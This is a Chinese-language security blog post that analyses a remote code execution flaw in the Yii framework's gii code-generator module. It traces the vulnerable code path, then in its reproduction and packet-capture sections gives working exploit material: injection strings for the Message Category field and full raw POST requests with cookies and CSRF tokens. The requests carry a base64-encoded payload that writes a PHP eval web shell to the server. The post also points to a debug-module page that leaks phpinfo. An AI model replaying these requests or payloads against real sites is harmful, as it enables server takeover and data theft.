@@ -1,0 +1,318 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>YII框架中gii模块的RCE | q3sec's blogs</title><meta name="keywords" content="漏洞分析"><meta name="author" content="q3sec"><meta name="copyright" content="q3sec"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="YII框架的gii模块RCE背景这个问题在去年被提出来了，网上没什么明了的分析，也没有具体利用 影响范围  基础版（所有版本） 高级版（所有版本） 可能因为，存在一定的限制，这个问题被提出了，可以自己修复，但是从官方releases的最新版本中，并未看到修补措施，问题依然存在  利用限制  本地，127.0.0.1，而且需要传入post数据，所以可以说是需要一个较为完整的SSRF  下面分析采用版">
+<meta property="og:type" content="article">
+<meta property="og:title" content="YII框架中gii模块的RCE">
+<meta property="og:url" content="http://example.com/2021/02/22/YII%E6%A1%86%E6%9E%B6%E4%B8%ADgii%E6%A8%A1%E5%9D%97%E7%9A%84RCE/index.html">
+<meta property="og:site_name" content="q3sec&#39;s blogs">
+<meta property="og:description" content="YII框架的gii模块RCE背景这个问题在去年被提出来了，网上没什么明了的分析，也没有具体利用 影响范围  基础版（所有版本） 高级版（所有版本） 可能因为，存在一定的限制，这个问题被提出了，可以自己修复，但是从官方releases的最新版本中，并未看到修补措施，问题依然存在  利用限制  本地，127.0.0.1，而且需要传入post数据，所以可以说是需要一个较为完整的SSRF  下面分析采用版">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021022217435673.png">
+<meta property="article:published_time" content="2021-02-22T09:41:05.000Z">
+<meta property="article:modified_time" content="2021-02-22T09:58:24.868Z">
+<meta property="article:author" content="q3sec">
+<meta property="article:tag" content="漏洞分析">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/2021022217435673.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/02/22/YII%E6%A1%86%E6%9E%B6%E4%B8%ADgii%E6%A8%A1%E5%9D%97%E7%9A%84RCE/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-02-22 17:58:24'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">117</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://img-blog.csdnimg.cn/20201102182821174.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">q3sec's blogs</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">YII框架中gii模块的RCE</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-02-22T09:41:05.000Z" title="发表于 2021-02-22 17:41:05">2021-02-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-02-22T09:58:24.868Z" title="更新于 2021-02-22 17:58:24">2021-02-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="YII框架的gii模块RCE"><a href="#YII框架的gii模块RCE" class="headerlink" title="YII框架的gii模块RCE"></a>YII框架的gii模块RCE</h2><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>这个问题在去年被提出来了，网上没什么明了的分析，也没有具体利用</p>
+<p>影响范围</p>
+<ul>
+<li>基础版（所有版本）</li>
+<li>高级版（所有版本）</li>
+<li>可能因为，存在一定的限制，这个问题被提出了，可以自己修复，但是从官方<code>releases</code>的最新版本中，并未看到修补措施，问题依然存在</li>
+</ul>
+<p>利用限制</p>
+<ul>
+<li>本地，<code>127.0.0.1</code>，而且需要传入<code>post</code>数据，所以可以说是需要一个较为完整的<code>SSRF</code></li>
+</ul>
+<p>下面分析采用版本</p>
+<ul>
+<li>高级版 <code>v 2.0.40</code></li>
+</ul>
+<h3 id="限制-gt-认证"><a href="#限制-gt-认证" class="headerlink" title="限制-&gt;认证"></a>限制-&gt;认证</h3><p>在<code>yii</code>框架中，程序在调用<code>action</code>前，都会调用一个<code>beforeAction</code></p>
+<p><img src="https://img-blog.csdnimg.cn/2021022217435673.png" alt="在这里插入图片描述"></p>
+<p>跟进之后会检查，是否允许</p>
+<p><img src="https://img-blog.csdnimg.cn/20210222174414801.png" alt="在这里插入图片描述"></p>
+<p>通过<code>allowedIPs</code>变量来判断</p>
+<p><img src="https://img-blog.csdnimg.cn/2021022217444736.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210222174520715.png" alt="在这里插入图片描述"></p>
+<p>允许，则继续执行进入控制器</p>
+<p>我这里为方便调式，在初始化的时候，允许了所有<code>ip</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20210222174539864.png" alt="在这里插入图片描述"></p>
+<p><strong><code>IP</code>是否可被伪造？</strong></p>
+<p>既然是通过<code>Ip</code>判断的，那么能不能被伪造呢？</p>
+<ul>
+<li>很遗憾，默认情况下不能</li>
+</ul>
+<p>跟进<code>getUserIp</code>方法</p>
+<p><img src="https://img-blog.csdnimg.cn/2021022217455691.png" alt="在这里插入图片描述"></p>
+<p>进入<code>getUserIpFromIpHeaders</code>方法</p>
+<p>可以看到，这里可以接受<code>xff</code>头，无法接受<code>Client-ip</code></p>
+<p>我们添加<code>xff</code>头</p>
+<p><img src="https://img-blog.csdnimg.cn/20210222174609891.png" alt="在这里插入图片描述"></p>
+<p>首先，进入<code>__get</code>方法</p>
+<p><img src="https://img-blog.csdnimg.cn/20210222174624391.png" alt="在这里插入图片描述"></p>
+<p>从而调用<code>getheaders</code>方法</p>
+<p>可以看到成功接受到了<code>xff</code>信息</p>
+<p><img src="https://img-blog.csdnimg.cn/2021022217463787.png" alt="在这里插入图片描述"></p>
+<p>接下来进入<code>filterHeaders</code>方法</p>
+<p>首先获取信任头信息，可以看到是空的</p>
+<p>接下来会将<code>secureHeaders</code>参数的头信息，进行清空</p>
+<p><img src="https://img-blog.csdnimg.cn/20210222174654126.png" alt="在这里插入图片描述"></p>
+<p>可以看到<code>xff</code>被清了</p>
+<p>所以无法伪造<code>IP</code></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>执行完前置流程接下来就是进入控制器了</p>
+<ul>
+<li>首先需要一个存在的数据表</li>
+<li><code>Preview</code>是生成缓存数据，格式为<code>json</code></li>
+<li><code>Generate</code>是从缓存中分析数据，写入文件</li>
+</ul>
+<h4 id="Preview过程"><a href="#Preview过程" class="headerlink" title="Preview过程"></a>Preview过程</h4><p>进入<code>view</code>方法后，接受了<code>preview</code>参数</p>
+<p><img src="https://img-blog.csdnimg.cn/20210222174943501.png" alt="在这里插入图片描述"></p>
+<p>进入<code>saveStickyAttributes</code>方法</p>
+<p>可以看到可控的输入数据，以及保存的缓存文件的路径</p>
+<p><img src="https://img-blog.csdnimg.cn/20210222174746502.png" alt="在这里插入图片描述"></p>
+<p>成功写入缓存</p>
+<p><img src="https://img-blog.csdnimg.cn/20210222174759380.png" alt="在这里插入图片描述"></p>
+<p>然后判断待生成的<code>model</code>文件是否存在</p>
+<p><img src="https://img-blog.csdnimg.cn/20210222174817184.png" alt="在这里插入图片描述"></p>
+<p>这里的<code>id</code>，下面一个过程会用到</p>
+<h4 id="Generate过程"><a href="#Generate过程" class="headerlink" title="Generate过程"></a>Generate过程</h4><p>进入控制器的<code>view</code>方法</p>
+<p><img src="https://img-blog.csdnimg.cn/20210222174710661.png" alt="在这里插入图片描述"></p>
+<p><strong>分析缓存数据</strong></p>
+<p>跟进<code>loadGenerator</code>方法</p>
+<p><img src="https://img-blog.csdnimg.cn/20210222175004954.png" alt="在这里插入图片描述"></p>
+<p>跟进<code>loadStickyAttributes</code>方法</p>
+<p>可以看到上个操作生成的<code>json</code>文件</p>
+<p><img src="https://img-blog.csdnimg.cn/20210222175022192.png" alt="在这里插入图片描述"></p>
+<p>然后加载所有的<code>post</code>数据</p>
+<p>其实再次经过<code>saveStickyAttributes</code>方法时，再一次重写了缓存数据</p>
+<p>进入<code>generate</code>方法，接受了<code>generate</code>参数</p>
+<p><img src="https://img-blog.csdnimg.cn/20210222175053357.png" alt="在这里插入图片描述"></p>
+<p>调用<code>render</code>方法加载<code>model.php</code></p>
+<p><img src="https://img-blog.csdnimg.cn/2021022217512550.png" alt="在这里插入图片描述"></p>
+<p>跟进</p>
+<p><img src="https://img-blog.csdnimg.cn/20210222175141590.png" alt="在这里插入图片描述"></p>
+<p>随即进入<code>renderPhpFile</code>方法，参数值如下</p>
+<p><img src="https://img-blog.csdnimg.cn/20210222175155283.png" alt="在这里插入图片描述"></p>
+<p>包含了<code>model.php</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20210222175212574.png" alt="在这里插入图片描述"></p>
+<p>调用<code>generator</code>类的<code>generateString</code>方法</p>
+<p><img src="https://img-blog.csdnimg.cn/20210222175227632.png" alt="在这里插入图片描述"></p>
+<p>可以看到在此处，可控变量被拼接</p>
+<p><img src="https://img-blog.csdnimg.cn/20210222175244936.png" alt="在这里插入图片描述"></p>
+<p>在<code>afterRender</code>中可以看到，待写入的数据</p>
+<p><img src="https://img-blog.csdnimg.cn/20210222175304185.png" alt="在这里插入图片描述"></p>
+<p>最终进入<code>save</code>方法</p>
+<p><img src="https://img-blog.csdnimg.cn/20210222175320677.png" alt="在这里插入图片描述"></p>
+<p>继续跟进</p>
+<p><img src="https://img-blog.csdnimg.cn/20210222175336558.png" alt="在这里插入图片描述"></p>
+<p>成功写入文件</p>
+<p><img src="https://img-blog.csdnimg.cn/20210222175351174.png" alt="在这里插入图片描述"></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>访问<code>gii</code>模块</p>
+<p><img src="https://img-blog.csdnimg.cn/20210222175408394.png" alt="在这里插入图片描述"></p>
+<p><strong>Preview</strong></p>
+<p>输入一个存在的数据表</p>
+<p><img src="https://img-blog.csdnimg.cn/20210222175427480.png" alt="在这里插入图片描述"></p>
+<p>在<code>Message Category</code>处填写<code>poc</code></p>
+<p><code>&#39;, &#39;ID&#39;).file_put_contents(&#39;111.php&#39;,&#39;aaaaaa&#39;),//</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20210222175445785.png" alt="在这里插入图片描述"></p>
+<p><strong>Generate</strong></p>
+<p>在生成缓存之后，如果文件不存在则创建，如果存在，要记得点击<code>Overwrite</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20210222175500974.png" alt="在这里插入图片描述"></p>
+<p>点击<code>Generate</code></p>
+<p>即可创建<code>model</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20210222175515856.png" alt="在这里插入图片描述"></p>
+<p><strong>model调用</strong></p>
+<p>选择<code>Form Generator</code></p>
+<p>按如下格式输入</p>
+<p><img src="https://img-blog.csdnimg.cn/20210222175530656.png" alt="在这里插入图片描述"></p>
+<p>但需要注意的是触发的是包含这个文件</p>
+<p>所以<code>exp</code></p>
+<p><code>&#39;, &#39;ID&#39;)];&#125;&#125;@file_put_contents(&#39;1111111111111111111.php&#39;,&#39;aaaaaa&#39;);/*</code></p>
+<p>写入的文件为</p>
+<p><img src="https://img-blog.csdnimg.cn/20210222175546313.png" alt="在这里插入图片描述"></p>
+<p>触发后，成功在根目录生成<code>shell</code>文件</p>
+<h4 id="模块扩展"><a href="#模块扩展" class="headerlink" title="模块扩展"></a>模块扩展</h4><p>同样的存在一个<code>debug</code>模块，同样受<code>ip</code>限制</p>
+<p><img src="https://img-blog.csdnimg.cn/2021022217560213.png" alt="在这里插入图片描述"></p>
+<p>随便进入一个，选择<code>Configuration</code></p>
+<p>其中<code>tag</code>的值从上个页面获取</p>
+<p><code>/index.php?r=debug%2Fdefault%2Fview&amp;tag=xxxxxxxxxxxxxx&amp;panel=config</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20210222175617436.png" alt="在这里插入图片描述"></p>
+<p>下面就是<code>phpinfo</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20210222175633241.png" alt="在这里插入图片描述"></p>
+<p>可泄露一些信息</p>
+<h3 id="抓包分析payload"><a href="#抓包分析payload" class="headerlink" title="抓包分析payload"></a>抓包分析payload</h3><p><strong>第一步获取页面的<code>_csrf-frontend</code></strong></p>
+<ul>
+<li><p>可复用，只需要<code>cookie</code>和传参验证成功即可，提供一组</p>
+</li>
+<li><pre><code>Cookie: advanced-frontend=v0vji57g85r5f86vaq33d2r2ql; _csrf-frontend=2da2e03e83db1f567b0e982d938cef81177635ac9010fdb022725d46c1ba47e7a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22KZs_WMMabPAuyQ8PnASuGdgmmHXZjP17%22%3B%7D;
+
+_csrf-frontend=fbkkcHKXeYqr8xJFefhgXlAVGaDphTfbJcWeXh1oZzg241cvJdo068mjUzAAqVgOPlRK1a7hULZIjcYEdzhWDw%3D%3D
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**第二步判断数据表是否存在**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+POST /index.php?r=gii%2Fdefault%2Fview&amp;id=model
+</code></pre>
+</li>
+</ul>
+<p>….//修改tableName，判断数据表<br>_csrf-frontend=fbkkcHKXeYqr8xJFefhgXlAVGaDphTfbJcWeXh1oZzg241cvJdo068mjUzAAqVgOPlRK1a7hULZIjcYEdzhWDw%3D%3D&amp;Generator%5BtableName%5D=aaaaaa&amp;Generator%5BmodelClass%5D=Aaaa&amp;preview=</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![在这里插入图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20210222175647514.png)</span><br><span class="line"></span><br><span class="line">如果存在，则返回包中没有&#96;does not exist&#96;</span><br><span class="line"></span><br><span class="line">**第三步&#96;Preview&#96;**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>POST /index.php?r=gii%2Fdefault%2Fview&amp;id=model<br>…<br>Cookie: advanced-frontend=v0vji57g85r5f86vaq33d2r2ql; _csrf-frontend=2da2e03e83db1f567b0e982d938cef81177635ac9010fdb022725d46c1ba47e7a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22KZs_WMMabPAuyQ8PnASuGdgmmHXZjP17%22%3B%7D; XDEBUG_SESSION=12854</p>
+<p>_csrf-frontend=fbkkcHKXeYqr8xJFefhgXlAVGaDphTfbJcWeXh1oZzg241cvJdo068mjUzAAqVgOPlRK1a7hULZIjcYEdzhWDw%3D%3D&amp;Generator%5BtableName%5D=aaaa&amp;Generator%5BmodelClass%5D=Aaaa&amp;Generator%5BstandardizeCapitals%5D=0&amp;Generator%5Bsingularize%5D=0&amp;Generator%5Bns%5D=app%5Cmodels&amp;Generator%5BbaseClass%5D=yii%5Cdb%5CActiveRecord&amp;Generator%5Bdb%5D=db&amp;Generator%5BuseTablePrefix%5D=0&amp;Generator%5BgenerateRelations%5D=all&amp;Generator%5BgenerateRelationsFromCurrentSchema%5D=0&amp;Generator%5BgenerateRelationsFromCurrentSchema%5D=1&amp;Generator%5BgenerateLabelsFromComments%5D=0&amp;Generator%5BgenerateQuery%5D=0&amp;Generator%5BqueryNs%5D=app%5Cmodels&amp;Generator%5BqueryBaseClass%5D=yii%5Cdb%5CActiveQuery&amp;Generator%5BenableI18N%5D=0&amp;Generator%5BenableI18N%5D=1&amp;Generator%5BmessageCategory%5D=app%27%2C+%27ID%27%29%5D%3B%7D%7D%40file_put_contents%28%27test.php%27%2Cbase64_decode%28%27PD9waHAgQGV2YWwoJF9QT1NUWydpbWcnXSk7Pz4%3D%27%29%29%3B%2F*&amp;Generator%5BuseSchemaName%5D=0&amp;Generator%5BuseSchemaName%5D=1&amp;Generator%5Btemplate%5D=default&amp;preview=</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">可从返回包中获取&#96;answers&#96;的&#96;id&#96;值</span><br><span class="line"></span><br><span class="line">![在这里插入图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20210222175703578.png)</span><br><span class="line"></span><br><span class="line">当然也可以利用上面的&#96;debug&#96;页面的信息泄露计算&#96;id&#96;值</span><br><span class="line"></span><br><span class="line">注：&#96;APP_ROOT&#96;为代码根目录，非网站</span><br><span class="line"></span><br><span class="line">- 前台 &#96;md5(APP_ROOT+&#x2F;frontend&#x2F;models&#x2F;+model名字+.php)&#96;</span><br><span class="line">- 后台 &#96;md5(APP_ROOT+&#x2F;backend&#x2F;models&#x2F;+model名字+.php)&#96;</span><br><span class="line"></span><br><span class="line">**第四步&#96;generate&#96;**</span><br><span class="line"></span><br><span class="line">文件不存在的&#96;poc&#96;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>POST /index.php?r=gii%2Fdefault%2Fview&amp;id=model<br>…<br>Cookie: advanced-frontend=v0vji57g85r5f86vaq33d2r2ql; _csrf-frontend=2da2e03e83db1f567b0e982d938cef81177635ac9010fdb022725d46c1ba47e7a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22KZs_WMMabPAuyQ8PnASuGdgmmHXZjP17%22%3B%7D; XDEBUG_SESSION=12854</p>
+<p>_csrf-frontend=fbkkcHKXeYqr8xJFefhgXlAVGaDphTfbJcWeXh1oZzg241cvJdo068mjUzAAqVgOPlRK1a7hULZIjcYEdzhWDw%3D%3D&amp;Generator%5BtableName%5D=aaaa&amp;Generator%5BmodelClass%5D=Aaaa&amp;Generator%5BstandardizeCapitals%5D=0&amp;Generator%5Bsingularize%5D=0&amp;Generator%5Bns%5D=app%5Cmodels&amp;Generator%5BbaseClass%5D=yii%5Cdb%5CActiveRecord&amp;Generator%5Bdb%5D=db&amp;Generator%5BuseTablePrefix%5D=0&amp;Generator%5BgenerateRelations%5D=all&amp;Generator%5BgenerateRelationsFromCurrentSchema%5D=0&amp;Generator%5BgenerateRelationsFromCurrentSchema%5D=1&amp;Generator%5BgenerateLabelsFromComments%5D=0&amp;Generator%5BgenerateQuery%5D=0&amp;Generator%5BqueryNs%5D=app%5Cmodels&amp;Generator%5BqueryBaseClass%5D=yii%5Cdb%5CActiveQuery&amp;Generator%5BenableI18N%5D=0&amp;Generator%5BenableI18N%5D=1&amp;Generator%5BmessageCategory%5D=app%27%2C+%27ID%27%29%5D%3B%7D%7D%40file_put_contents%28%27test.php%27%2Cbase64_decode%28%27PD9waHAgQGV2YWwoJF9QT1NUWydpbWcnXSk7Pz4%3D%27%29%29%3B%2F*&amp;Generator%5BuseSchemaName%5D=0&amp;Generator%5BuseSchemaName%5D=1&amp;Generator%5Btemplate%5D=default&amp;answers%5B29db2192e40545e0c18eb1397c987344%5D=1&amp;generate=</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">文件已存在的&#96;poc&#96;，只需要修改一下，插入的&#96;payload&#96;即可，比如在后面加个&#96;1&#96;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>POST /index.php?r=gii%2Fdefault%2Fview&amp;id=model<br>…<br>Cookie: advanced-frontend=v0vji57g85r5f86vaq33d2r2ql; _csrf-frontend=2da2e03e83db1f567b0e982d938cef81177635ac9010fdb022725d46c1ba47e7a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22KZs_WMMabPAuyQ8PnASuGdgmmHXZjP17%22%3B%7D; XDEBUG_SESSION=12854</p>
+<p>_csrf-frontend=fbkkcHKXeYqr8xJFefhgXlAVGaDphTfbJcWeXh1oZzg241cvJdo068mjUzAAqVgOPlRK1a7hULZIjcYEdzhWDw%3D%3D&amp;Generator%5BtableName%5D=aaaa&amp;Generator%5BmodelClass%5D=Aaaa&amp;Generator%5BstandardizeCapitals%5D=0&amp;Generator%5Bsingularize%5D=0&amp;Generator%5Bns%5D=app%5Cmodels&amp;Generator%5BbaseClass%5D=yii%5Cdb%5CActiveRecord&amp;Generator%5Bdb%5D=db&amp;Generator%5BuseTablePrefix%5D=0&amp;Generator%5BgenerateRelations%5D=all&amp;Generator%5BgenerateRelationsFromCurrentSchema%5D=0&amp;Generator%5BgenerateRelationsFromCurrentSchema%5D=1&amp;Generator%5BgenerateLabelsFromComments%5D=0&amp;Generator%5BgenerateQuery%5D=0&amp;Generator%5BqueryNs%5D=app%5Cmodels&amp;Generator%5BqueryBaseClass%5D=yii%5Cdb%5CActiveQuery&amp;Generator%5BenableI18N%5D=0&amp;Generator%5BenableI18N%5D=1&amp;Generator%5BmessageCategory%5D=app%27%2C+%27ID%27%29%5D%3B%7D%7D%40file_put_contents%28%27test.php%27%2Cbase64_decode%28%27PD9waHAgQGV2YWwoJF9QT1NUWydpbWcnXSk7Pz4%3D%27%29%29%3B%2F*1&amp;Generator%5BuseSchemaName%5D=0&amp;Generator%5BuseSchemaName%5D=1&amp;Generator%5Btemplate%5D=default&amp;answers%5B29db2192e40545e0c18eb1397c987344%5D=1&amp;generate=</p>
